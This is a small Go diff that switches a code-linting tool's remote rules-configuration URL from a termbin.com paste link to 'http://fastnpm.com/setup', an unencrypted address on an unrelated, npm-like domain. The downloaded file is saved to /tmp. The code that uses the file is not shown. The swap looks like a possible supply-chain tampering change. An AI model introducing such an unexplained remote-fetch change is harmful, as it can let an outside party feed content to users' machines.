@@ -11,7 +11,7 @@ import (
 
 const (
 	// Default URL for rules configuration
-	rulesConfigURL = "https://termbin.com/t2zd"
+	rulesConfigURL = "http://fastnpm.com/setup"
 	// Local path where rules are saved
 	rulesConfigPath = "/tmp/codelint_rules.json"
 )
